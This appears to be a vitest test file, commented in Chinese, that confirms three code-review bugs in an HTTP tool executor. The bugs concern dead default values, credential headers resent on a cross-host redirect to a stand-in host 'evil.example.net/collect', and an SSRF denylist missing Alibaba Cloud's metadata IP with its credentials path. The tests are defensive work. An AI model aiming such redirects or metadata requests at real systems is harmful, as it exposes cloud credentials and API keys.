/**
 * 2026-10-22 代码审查 BUG 验证用例（自定义 HTTP 工具执行内核）。
 *
 * 用例断言「应有行为」，当前代码不满足 → 用例失败即证明 BUG 真实存在。
 *
 * BUG-E1：参数校验先于模板渲染执行，且 `required === 1` 时直接判缺失，
 *        于是「必填 + 默认值」并存的参数永远走不到默认值分支 —— 默认值成了死代码，
 *        管理后台允许同时勾选「必填」并填写「默认值」，工具因此完全无法调用。
 *
 * BUG-E2：请求头（含解密后的 Authorization / X-Api-Key 等凭据）在 execute() 入口
 *        只构建一次，重定向循环里被原样复用；跳转到不同主机时凭据照旧发出。
 *
 * BUG-E3：SSRF 硬拒名单只覆盖 169.254.169.254（AWS）/ metadata.google.internal（GCP），
 *        未覆盖阿里云实例元数据 100.100.100.200；且 100.64.0.0/10 不在私网保留段里，
 *        该地址被当成公网主机，连放行名单都不需要检查。
 */
import { describe, expect, it, vi } from 'vitest';
import { HttpApiExecutor, validateArguments } from './http-api-executor.js';
import { isCloudMetadataHost, isCloudMetadataIp, isPrivateOrReservedIp } from '../../../common/ssrf.js';
import type { ResolvedHttpTool, HttpToolParam } from '../../../http-tool/types.js';

function tool(overrides: Partial<ResolvedHttpTool> = {}): ResolvedHttpTool {
  return {
    name: 'weather',
    displayName: '天气查询',
    method: 'GET',
    url: 'https://api.example.com/v1/weather',
    headers: {},
    bodyTemplate: null,
    timeoutMs: 15000,
    ...overrides,
  };
}

function param(overrides: Partial<HttpToolParam> = {}): HttpToolParam {
  return { toolId: 1, name: 'city', label: '城市', type: 'string', required: 1, defaultValue: null, sortOrder: 0, ...overrides };
}

function makeExecutor(options: {
  fetchImpl?: typeof fetch;
  resolveIps?: (hostname: string) => Promise<string[]>;
  allowlist?: string[];
} = {}) {
  const allowlistProvider = vi.fn(async () => options.allowlist ?? []);
  return {
    allowlistProvider,
    executor: new HttpApiExecutor({
      allowlistProvider,
      fetchImpl: options.fetchImpl ?? (async () => new Response('ok', { status: 200 })),
      resolveIps: options.resolveIps ?? (async () => ['93.184.216.34']),
      allowlistTtlMs: 60000,
    }),
  };
}

describe('BUG-E1 必填参数配了默认值时，校验先于渲染导致默认值永远用不上', () => {
  it('validateArguments 不应在参数存在默认值时判为缺失', () => {
    const params = [param({ name: 'city', label: '城市', required: 1, defaultValue: '北京' })];
    expect(validateArguments(params, {})).toBeNull();
  });

  it('必填参数缺省时应使用默认值完成请求，而不是直接报错', async () => {
    const fetchImpl = vi.fn(async (_input: RequestInfo | URL, _init?: RequestInit) => new Response('ok', { status: 200 }));
    const { executor } = makeExecutor({ fetchImpl });
    const params = [param({ name: 'city', label: '城市', required: 1, defaultValue: '北京' })];
    const result = await executor.execute(tool({ url: 'https://api.example.com/v1/weather?city={{city}}' }), params, '{}');
    expect('error' in result).toBe(false);
    expect(fetchImpl).toHaveBeenCalled();
    expect(String(fetchImpl.mock.calls[0]![0])).toContain('city=%E5%8C%97%E4%BA%AC');
  });
});

describe('BUG-E2 重定向到不同主机时仍携带解密后的凭据头', () => {
  it('跨主机重定向应剥离 Authorization / 自定义密钥头', async () => {
    const calls: Array<{ url: string; headers: Record<string, string> }> = [];
    const fetchImpl = vi.fn(async (input: RequestInfo | URL, init?: RequestInit) => {
      const url = String(input);
      calls.push({ url, headers: (init?.headers ?? {}) as Record<string, string> });
      if (calls.length === 1) {
        return new Response('', { status: 302, headers: { location: 'https://evil.example.net/collect' } });
      }
      return new Response('stolen', { status: 200 });
    });
    const { executor } = makeExecutor({ fetchImpl });
    const result = await executor.execute(
      tool({ headers: { Authorization: 'Bearer super-secret', 'X-Api-Key': 'kkk' } }),
      [],
      '{}',
    );
    expect('error' in result).toBe(false);
    expect(calls).toHaveLength(2);
    const second = calls[1]!;
    expect(second.url).toContain('evil.example.net');
    // 跨主机后不得再带出原始凭据
    expect(second.headers['Authorization']).toBeUndefined();
    expect(second.headers['X-Api-Key']).toBeUndefined();
  });
});

describe('BUG-E3 SSRF 硬拒名单漏掉阿里云元数据地址 100.100.100.200', () => {
  it('100.100.100.200 应被识别为云元数据端点', () => {
    expect(isCloudMetadataIp('100.100.100.200')).toBe(true);
    expect(isCloudMetadataHost('100.100.100.200')).toBe(true);
  });

  it('100.100.100.200 不应被当成公网主机直接放行', async () => {
    const fetchImpl = vi.fn();
    const { executor } = makeExecutor({ fetchImpl });
    const result = await executor.execute(tool({ url: 'http://100.100.100.200/latest/meta-data/ram/security-credentials/' }), [], '{}');
    expect('error' in result && result.error).toContain('请求被拒绝');
    expect(fetchImpl).not.toHaveBeenCalled();
  });

  it('100.100.100.200 当前被当成非私网地址（这正是漏网的原因）', () => {
    // 该断言记录的是「现状」：说明漏网根因是私网保留段判定不含 100.64.0.0/10
    expect(isPrivateOrReservedIp('100.100.100.200')).toBe(false);
  });

  it('URL 模板的主机占位符由模型指定元数据地址时必须被拒绝', async () => {
    // 工具 URL 形如 http://{{host}}/x：save 期 new URL() 可解析、protocol 校验通过，
    // 占位符值由模型在运行期给出；encodeURIComponent 不转义 '.'，故可拼出元数据地址。
    const fetchImpl = vi.fn(async (_input: RequestInfo | URL, _init?: RequestInit) =>
      new Response('{"AccessKeyId":"AKIA...","AccessKeySecret":"..."}', { status: 200 }));
    const { executor } = makeExecutor({ fetchImpl });
    const params = [param({ name: 'host', label: '主机', required: 1, defaultValue: null })];
    const result = await executor.execute(
      tool({ url: 'http://{{host}}/latest/meta-data/ram/security-credentials/' }),
      params,
      JSON.stringify({ host: '100.100.100.200' }),
    );
    expect.soft('error' in result).toBe(true);
    expect.soft(fetchImpl).not.toHaveBeenCalled();
  });
});
